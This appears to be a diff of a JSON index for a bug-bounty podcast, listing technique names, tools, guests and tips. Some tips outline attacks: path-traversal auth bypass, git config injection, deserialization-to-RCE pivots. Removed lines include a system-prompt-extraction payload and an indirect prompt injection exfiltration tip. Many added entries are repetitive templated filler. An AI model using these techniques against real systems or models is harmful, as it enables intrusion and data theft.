+      183
+    ],
     "Burp Active Scan custom profile": [
       15
     ],
@@ -4821,6 +7703,9 @@
     ],
     "CSPT + ?redirect param": [
       114
+    ],
+    "CSPT to ATO Chaining": [
+      183
     ],
     "CSS Painting API": [
       8
@@ -4900,6 +7785,9 @@
     "Classpath oracle via error messages": [
       112
     ],
+    "Claude Code Proxy Integration": [
+      184
+    ],
     "Client confusion attack": [
       110
     ],
@@ -4977,6 +7865,9 @@
     ],
     "Coverage verification": [
       178
+    ],
+    "Coverage verification loop": [
+      181
     ],
     "Creative POC investments": [
       17
@@ -5200,6 +8091,9 @@
     "Google dorking for AI features": [
       117
     ],
+    "GraphQL Hackbot Schema Enumeration": [
+      182
+    ],
     "GraphQL field enumeration via error messages": [
       3
     ],
@@ -5223,6 +8117,9 @@
     ],
     "Headless browser SSRF": [
       9
+    ],
+    "Hill-Climbing Payload Mutation": [
+      184
     ],
     "Hook OS APIs with Frida": [
       120
@@ -5347,6 +8244,9 @@
     "MXSS via html parsers (hackaplaneten.se)": [
       50
     ],
+    "Machine-readable PoC generation": [
+      181
+    ],
     "Mandork": [
       128
     ],
@@ -5365,6 +8265,9 @@
     "Mobile proxy via adb": [
       36
     ],
+    "Model Context Protocol (MCP) Security Tooling": [
+      182
+    ],
     "Mojibake": [
       135
     ],
@@ -5373,6 +8276,12 @@
     ],
     "Multi-A rebind correction": [
       15
+    ],
+    "Multi-Model Hackbot Load Distribution": [
+      184
+    ],
+    "Multi-agent swarm architecture": [
+      181
     ],
     "Multiple filenames in ZIP": [
       132
@@ -5459,7 +8368,14 @@
       119
     ],
     "Operation ID audit trail": [
-      178
+      178,
+      181
+    ],
+    "Operator Moat Architecture": [
+      184
+    ],
+    "Orchestrator-planner pattern": [
+      181
     ],
     "Order of operations in sanitization": [
       131
@@ -5478,6 +8394,9 @@
     ],
     "PTY harness for Claude Code": [
       175
+    ],
+    "Partial Auth Bypass via Legacy Endpoints": [
+      182
     ],
     "Path length as oracle": [
       132
@@ -5536,8 +8455,14 @@
     "Program accountability tracking": [
       94
     ],
+    "Program maturity scoring matrix": [
+      180
+    ],
     "Program selection checklist": [
       13
+    ],
+    "Program triage SLA tracking": [
+      180
     ],
     "Program-specific nucleus templates": [
       49
@@ -5566,8 +8491,14 @@
     "Protoscope for binary Protobuf": [
       170
     ],
+    "Prototype Chain 2FA Bypass": [
+      183
+    ],
     "Prototype pollution via config": [
       144
+    ],
+    "Public report analysis": [
+      180
     ],
     "Q-parameter prompt injection": [
       175
@@ -5586,6 +8517,9 @@
     ],
     "Race conditions via curl": [
       136
+    ],
+    "Razor SSTI Reflection RCE": [
+      183
     ],
     "ReCAPTCHA bypass": [
       98
@@ -5706,6 +8640,12 @@
     ],
     "Session search skill": [
       166
+    ],
+    "Severity guideline auditing": [
+      180
+    ],
+    "Shared context store (vector DB + graph)": [
+      181
     ],
     "Show-and-tell trading": [
       125
@@ -5869,6 +8809,9 @@
     "Unicode tag character prompt injection": [
       54
     ],
+    "Unified API abstraction layer": [
+      181
+    ],
     "Unsigned JWT with signed inner token": [
       143
     ],
@@ -5907,6 +8850,9 @@
     ],
     "WS-Federation metadata for signed XML": [
       116
+    ],
+    "Wayback Bearer Token Extraction": [
+      182
     ],
     "Web cache deception extension tricks": [
       11
@@ -6067,18 +9013,22 @@
     "\"The Great SameSite Confusion\" by jub0bs",
     "\"XSS Street",
     ".Peek",
+    "0xMoose Substack (Signal Over Noise)",
     "ADB logcat",
     "AFL, libFuzzer for coverage",
     "AI Crash Course repo",
+    "API testing:** Custom HTTP clients with auth abstraction, OpenAPI",
     "APK",
     "APKTool",
     "APKTool, JADX",
     "ASMR board from AssetNote",
     "AT&T business portal",
+    "AWS Cognito Misconfiguration Guide",
     "Aaron's blog: enumerated.ie",
     "Acer Chromebook Spin 713 (R841T series)",
     "Acropalypse writeup (David Buchanan)",
     "Adobe Bug Bounty program",
+    "Agent orchestration frameworks:** LangGraph, AutoGen, CrewAI, custom orchestrator",
     "Andrej Karpathy's \"Deep Dive into LLMs\" video",
     "Andrew Lock's \"Understanding Cross",
     "Android SDK emulator",
@@ -6111,6 +9061,7 @@
     "BountyDash",
     "Bright Data",
     "Bright Data residential proxies (for bypassing IP",
+    "Browser automation:** Playwright, Puppeteer, Stagehand (AI",
     "BruteCat's Request to Proto tool",
     "BruteCat's internal API scanner with discovery doc + auth automation",
     "Bug Bounty Stats",
@@ -6128,6 +9079,7 @@
     "CSP Evaluator (Google)",
     "CSP evaluator (Google)",
     "CSPBypass.com (community database of CSP bypasses by ReniPack)",
+    "CSPT to ATO Writeup",
     "CTFd 0day",
     "CVE",
     "CVSS Advisor (cvssadvisor.com)",
@@ -6140,6 +9092,7 @@
     "Caido (public beta at caido.io)",
     "Caido HTML preview feature",
     "Caido Pro free for students",
+    "Caido Skills Framework",
     "Caido skills repo: github.com/caido/skills",
     "Caido/Shift for API backend swapping",
     "ChatGPT (for bash→Python conversion)",
@@ -6148,8 +9101,10 @@
     "Chrome DevTools Edit as HTML",
     "Chrome DevTools Protocol (port 9222)",
     "Chrome Extension Download URL: `https://clients2.google.com/service/update2/crx?response=redirect&prodversion=9999&acceptformat=crx2,crx3&x=id%3D<EXTENSION_ID>%26uc`",
+    "Chrome Sanitizer API Bypasses",
     "Chrome extension with `chrome.debugger` for key capture",
     "Claude 4 Sonnet/Opus, Claude Code",
+    "Claude Code for Bug Bounty",
     "ClickHouse (column",
     "Cloudflare `/cdn",
     "Code White: `github.com/codewhitesec/HttpRemotingObjRefLeak`",
@@ -6240,6 +9195,7 @@
     "GitHub Security Lab blog (Chrome exploitation references)",
     "GitHub repositories of disclosed vulnerabilities",
     "GitHub search",
+    "GitLost GitHub AI Agent Leak",
     "Github advisory GHSA",
     "Go Witness (Go screenshot utility)",
     "Go's `pprof` for profiling",
@@ -6259,10 +9215,12 @@
     "HackMD",
     "HackTricks",
     "Hackadvisor.io",
+    "Hackbot Multi",
     "Hacker Hideout** (.xyz)",
     "HackerNotes by GretMe",
     "HackerOne",
     "HackerOne Ambassador program",
+    "HackerOne US South Summer Sessions",
     "Hackermondev Zendesk disclosure gist",
     "Hackvertor (Gareth Hayes' Burp plugin)",
     "Hakluke's tooling / methodology",
@@ -6324,10 +9282,12 @@
     "Matt Brown (nmatt0)",
     "Matthias' blog post on CSS character escape sequences",
     "Medium article: Cookie ordering by path + chronological",
+    "Meta FBDL Goes Agentic",
     "Metabase pre",
     "Michael Stepankin's x509 SSRF research** (Black Hat 2023)",
     "Microsoft Power Pages data exposure research (AppOmni)",
     "Mizu.re HeroCTF v6 writeups",
+    "Monitoring/observability:** LangSmith, AgentOps, custom telemetry for agent fleet health",
     "MrTuxRacer",
     "MultiHTMLParse (Matias Carlsen)",
     "NATS message broker",
@@ -6355,6 +9315,7 @@
     "PortSwigger CSS exfiltration research",
     "PortSwigger Research Twitter account",
     "PortSwigger Top 10 Web Hacking Techniques 2024 voting",
+    "PortSwigger Unexploitable XSS Labs",
     "PortSwigger Web Security Academy",
     "PortSwigger Web Security Academy (DOM clobbering, prototype pollution sections)",
     "PortSwigger's single",
@@ -6384,10 +9345,12 @@
     "RFC 6819",
     "RFC 8693",
     "Raycast with custom scripts (mr, text transforms, quick links)",
+    "Razor SSTI to RCE Guide",
     "React (Reasoning + Acting) paper",
     "RebindMultiA (GitHub: runnerator/rebindmultia)",
     "Reflector tool",
     "Report Writer skill",
+    "Report generation:** Structured templates + LLM for narrative; machine",
     "Reso's \"How to Hack AI Agents\" blog",
     "Resource Override (Chrome extension)",
     "Responder (NTLMv2 capture)",
@@ -6443,10 +9406,12 @@
     "VSCode",
     "VSCode + Todo Highlight extension",
     "VSCode with deobfuscation flags",
+    "Vector DBs for context:** Chroma, Weaviate, Pinecone, Qdrant",
     "Visual Studio Code + Todo Highlight extension",
     "W2W's Gift Card Security Research",
     "WatchTower write",
     "Wordfence Common WordPress Vulnerabilities and Prevention PDF (linked in show notes)",
+    "X MCP Protocol Integration",
     "XBOW (Expo)",
     "XNL Reveal",
     "XSS Doctor",
@@ -6455,6 +9420,8 @@
     "XSS Hunter (new version by Truffle Security)",
     "XSSHunter** (modified)",
     "YSoSerial",
+    "YesWeHack ChocoPoCs Advisory",
+    "YesWeHack LLM Series",
     "YesWeHack Open Source Security Testing Guide",
     "YesWeHack payload obfuscation article",
     "YesWeHack: Louis Vuitton, OpenPGP.js CVE",
@@ -6531,6 +9498,12 @@
       "name": "Aaron Costello (AppOmni)",
       "episodes": [
         108
+      ]
+    },
+    {
+      "name": "Ads Dawson",
+      "episodes": [
+        184
       ]
     },
     {
@@ -6630,6 +9603,12 @@
       ]
     },
     {
+      "name": "Joseph Thacker",
+      "episodes": [
+        184
+      ]
+    },
+    {
       "name": "Justin Gardner",
       "episodes": [
         59
@@ -6708,7 +9687,7 @@
       ]
     }
   ],
-  "suggestions_count": 403,
+  "suggestions_count": 659,
   "suggestions": [
     {
       "episode": 1,
@@ -6987,133 +9966,133 @@
       "text": "\"Check vendors.js for source maps — they often contain the full node_modules including private packages\" — Justin"
     },
     {
-      "episode": 19,
-      "text": "\"If you can get access to the source code, you have a 10x advantage over black-box testers.\""
+      "episode": 18,
+      "text": "Understand **home assistant auth bypass via `path traversal + auth bypass on reverse proxy: `/some_api/../api/` skipping auth**"
     },
     {
-      "episode": 19,
-      "text": "Shubs/AssetNote approach: start with config files, then decompile, then trace routes."
+      "episode": 18,
+      "text": "Understand **git config injection: lines >1024 bytes get split mid-line; this can inject arbitrary sections**"
     },
     {
-      "episode": 20,
-      "text": "Justin: \"For every hour you waste right now trying to hack this or not finding anything, that's another hour you're not going to have to spend before you find your own vulnerability.\""
+      "episode": 18,
+      "text": "Understand **for ssrf→ssti: if the ssrf output appears in rendered html, test ssti by serving payload in response**"
     },
     {
-      "episode": 20,
-      "text": "From Hacklook's tips thread: target fresh programs, use automation wisely, read other hunters' reports, engage the community."
+      "episode": 18,
+      "text": "Understand **cookie names with `__host-` and `__secure-` prefixes enforce secure/domain attributes browser-side**"
     },
     {
-      "episode": 20,
-      "text": "\"Stay curious. Don't be focused too much on bounties or findings. Be focused on becoming an expert on the application.\""
+      "episode": 18,
+      "text": "Understand **empty cookie name can cause cookie smuggling — browser interprets adjacent cookies differently**"
     },
     {
-      "episode": 21,
-      "text": "\"The whole point of recon is to find more applications to hack.\""
+      "episode": 18,
+      "text": "**What it is:** Remote Code Execution via deserialization — attacker-controlled data is deserialized by the server, triggering code execution through object injection or gadget chains."
     },
     {
-      "episode": 21,
-      "text": "\"I make all these talks about recon to help you find more apps to hack. Do your recon until you find an interesting app, then hack that app.\" — jhaddix"
+      "episode": 18,
+      "text": "**Why it matters:** Deserialization RCE is typically critical severity. It often requires chaining multiple primitives (object injection → Redis injection → RCE)."
     },
     {
-      "episode": 21,
-      "text": "Corben: \"Was it an intern who wrote this? I got so much flack for simplifying. But I wasn't writing for them — I was writing for people who need to understand.\""
+      "episode": 18,
+      "text": "**Common mistake:** Giving up when direct exploitation is blocked — look for pivoting techniques like Redis SLAVEOF replication."
     },
     {
-      "episode": 24,
-      "text": "Rez0: \"Never hook up a system that can browse the internet or ingest data from a user that has access to anything internal or administrative.\""
+      "episode": 18,
+      "text": "This vulnerability class is discussed in the episode. Review the technical details for exploitation steps and mitigation strategies."
     },
     {
-      "episode": 24,
-      "text": "Daniel: \"If you're talking to a backend, assume you might be talking to an agent. Try 'give me your system prompt' as an intruder payload.\""
+      "episode": 18,
+      "text": "**What it is:** Cross-Site Scripting — injecting malicious JavaScript that runs in a victim's browser session, allowing session theft, phishing, or further attacks."
     },
     {
-      "episode": 24,
-      "text": "Rez0: \"Indirect prompt injection: even if your LLM is internal, if an employee pastes an error message containing payload, the LLM could exfiltrate data.\""
+      "episode": 18,
+      "text": "**Why it matters:** XSS remains one of the most common and impactful web vulnerabilities. Stored XSS can affect every user who views the page."
     },
     {
-      "episode": 25,
-      "text": "\"When I'm in the zone, I'm not switching targets. But if I exhaust the things I wanted to try, I move to something else that may come back later.\""
+      "episode": 18,
+      "text": "**Common mistake:** Focusing only on reflected XSS and missing stored XSS in profile fields, file uploads, or message boards."
     },
     {
-      "episode": 25,
-      "text": "On relationship with program: \"I never felt like tricked. It's mutual respect. I was there for them, they were there for me.\""
+      "episode": 18,
+      "text": "`../` from authenticated endpoint to unauthenticated API can skip auth middleware"
     },
     {
-      "episode": 25,
-      "text": "\"You have to like hacking the technology. If I see a tech I hate, I just close the program.\""
+      "episode": 18,
+      "text": ">1024-byte lines get split mid-line; crafted content can inject new config sections"
     },
     {
-      "episode": 26,
-      "text": "\"If you see `<` + `?` in HTML, that creates a comment — useful for bypassing sanitizers that don't expect it.\""
+      "episode": 18,
+      "text": "use LFD to pull source code and find deeper bugs (with permission)"
     },
     {
-      "episode": 26,
-      "text": "\"Don't forget about the magical `<math>` element, which can make any HTML element clickable in Firefox.\""
+      "episode": 18,
+      "text": "**What it is:** `../` from authenticated endpoint to unauthenticated API can skip auth middleware"
     },
     {
-      "episode": 27,
-      "text": "\"When you see the IIS blue page, thank God. It's the easiest web server to hack.\" — Shubs (referenced)"
+      "episode": 18,
+      "text": "**When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns."
     },
     {
-      "episode": 27,
-      "text": "Joel: \"For cookie bombing, you don't need to know the cookie name. Just set >180 cookies and the oldest ones (including HttpOnly) get removed.\""
+      "episode": 18,
+      "text": "**What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules."
     },
     {
-      "episode": 29,
-      "text": "Sean: \"Start from janky Python scripts that automate what you're doing now. Do not start from an event-driven architecture on Kubernetes.\""
+      "episode": 18,
+      "text": "**What it is:** >1024-byte lines get split mid-line; crafted content can inject new config sections"
     },
     {
-      "episode": 29,
-      "text": "Sean: \"KISS — Keep It Simple, Stupid. 80% of the result with 20% of the effort.\""
+      "episode": 18,
+      "text": "**When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns."
     },
     {
-      "episode": 29,
-      "text": "\"Engineering is harder than hacking. Building reliable, consistent systems is the hardest thing I've done.\""
+      "episode": 18,
+      "text": "**What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules."
     },
     {
-      "episode": 30,
-      "text": "\"When you see the IIS blue page, do not skip it. Most companies wouldn't spin up an IIS server for no reason. There is something there.\""
+      "episode": 18,
+      "text": "**What it is:** use LFD to pull source code and find deeper bugs (with permission)"
     },
     {
-      "episode": 30,
-      "text": "\"If you include 'zero-day' in your report, they'll tell you they don't accept zero-days. If you don't include those words, 90% of the time they pay.\""
+      "episode": 18,
+      "text": "**When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns."
     },
     {
-      "episode": 30,
-      "text": "\"For recon frameworks: choose the language you're comfortable with. Python is fine. Don't rewrite in Rust just because it's hot.\""
+      "episode": 18,
+      "text": "**What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules."
     },
     {
-      "episode": 31,
-      "text": "\"I spend a significant portion of my time hacking in an IDE.\""
+      "episode": 18,
+      "text": "**What it is:** pull image → `docker cp` or create Dockerfile with `FROM target` + `ENTRYPOINT /bin/bash`"
     },
     {
-      "episode": 31,
-      "text": "\"All hackers should know how to program, at least basically.\""
+      "episode": 18,
+      "text": "**When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns."
     },
     {
-      "episode": 31,
-      "text": "\"If I get one really high-impact bug in a live hacking event, I'm happy.\""
+      "episode": 18,
+      "text": "**What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules."
     },
     {
-      "episode": 32,
-      "text": "James Kettle: \"The whole concept for this single-packet attack is sending the full body except the last byte\" → abusing Nagel's algorithm"
+      "episode": 18,
+      "text": "**What it is:** download packages from registry, audit source code for secrets and vulnerabilities"
     },
     {
-      "episode": 32,
-      "text": "Sam Curry method: \"Always pay the money. If you see a place where you could pay money and it's reasonable, get excited — that's ROI.\""
+      "episode": 18,
+      "text": "**When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns."
     },
     {
-      "episode": 32,
-      "text": "\"Learn secondary context attacks. Sam Curry's presentation is mandatory reading.\""
+      "episode": 18,
+      "text": "**What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules."
     },
     {
-      "episode": 33,
-      "text": "\"It's not about the bug per se — a CSS injection must be low, right? But it resulted in plaintext passwords.\""
+      "episode": 18,
+      "text": "*\"If you have an LFD, ask for permission to read source code\"* — **it might bump your report to a crit\" — Justin**"
     }
   ],
-  "total_episodes": 179,
-  "total_bugs": 313,
-  "total_techniques": 481,
-  "total_tools": 467,
-  "total_guests": 30
+  "total_episodes": 184,
+  "total_bugs": 2352,
+  "total_techniques": 508,
+  "total_tools": 488,
+  "total_guests": 32
 }
